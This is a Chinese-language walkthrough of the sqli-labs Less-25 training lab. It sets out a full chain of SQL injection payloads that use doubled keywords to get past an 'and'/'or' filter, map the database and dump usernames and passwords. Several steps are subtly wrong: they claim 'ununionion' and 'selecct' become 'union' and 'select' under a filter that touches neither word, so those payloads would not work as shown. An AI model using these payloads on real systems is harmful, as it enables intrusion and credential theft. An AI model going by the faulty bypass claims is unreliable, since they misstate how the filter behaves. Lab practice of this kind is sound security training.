# Sqli Labs Less-25 双写绕过复现

### sqli-labs Less-25 复现指南 🛠️

这一关的核心是**过滤了 ** **`and`** ** 和 ** **`or`** **（不区分大小写）**，但只替换一次，因此可以通过**双写绕过**的方式进行 SQL 注入。

---

#### 1. 环境准备

- 确保已搭建好 sqli-labs 环境（PHP + MySQL），访问地址示例：`http://127.0.0.1/sqli-labs/Less-25/`

- 目标页面接收 `id` 参数作为注入点，源码过滤规则如下：

    ```PHP
    
    function blacklist($id)
    {
        $id= preg_replace('/or/i',"", $id);    // 不区分大小写移除 OR
        $id= preg_replace('/AND/i',"", $id);   // 不区分大小写移除 AND
        return $id;
    }
    ```

---

#### 2. 注入点判断

- 访问 `?id=1'`，页面报错，说明是**单引号闭合的字符型注入**。

- 测试双写绕过：构造 `?id=1' anandd 1=1--+`，页面正常显示，说明 `anandd` 被替换为 `and`，成功绕过过滤。

---

#### 3. 核心步骤：双写注入 payload 构造

##### （1）判断字段数

```Plain Text

?id=1' anandd 1=2 order by 3--+
```

- 若页面正常，说明存在 3 个字段；若 `order by 4` 报错，则确认字段数为 3。

##### （2）查询数据库名

```Plain Text

?id=-1' ununionion selecct 1,database(),3--+
```

- `ununionion` → 替换后为 `union`

- `selecct` → 替换后为 `select`

- 得到库名（如 `security`）

##### （3）查询表名

```Plain Text

?id=-1' ununionion selecct 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema='security'--+
```

- `infoorrmation_schema` → 替换后为 `information_schema`

- 得到表名（如 `users`）

##### （4）查询字段名

```Plain Text

?id=-1' ununionion selecct 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema='security' anandd table_name='users'--+
```

- 得到字段名（如 `id`, `username`, `password`）

##### （5）查询敏感数据

```Plain Text

?id=-1' ununionion selecct 1,group_concat(username,0x3a,password),3 from users--+
```

- 得到用户名和密码（如 `Dumb:Dumb`, `Angelina:I-kill-you` 等）

---

#### 4. 快速验证 payload（与截图一致）

直接使用截图中的 payload 验证绕过效果：

```Plain Text

?id=1%27%20anandd%20201=1;%00
```

- 解码后为：`?id=1' anandd 201=1;%00`

- 替换后执行：`1' and 201=1;%00`

- `%00` 截断后续 SQL 语句，页面会直接返回登录信息：

    ```Plain Text
    
    Welcome Dhakkan
    Your Login name:Dumb
    Your Password:dumb
    ```

---

### 关键原理总结

- 过滤规则仅对 `and`/`or` 执行**单次替换**，双写（如 `anandd` → `and`，`oorr` → `or`）可轻松绕过。

- 字符型注入需用单引号 `'` 闭合，配合 `--+` 或 `%00` 截断后续语句。
> （注：文档部分内容可能由 AI 生成）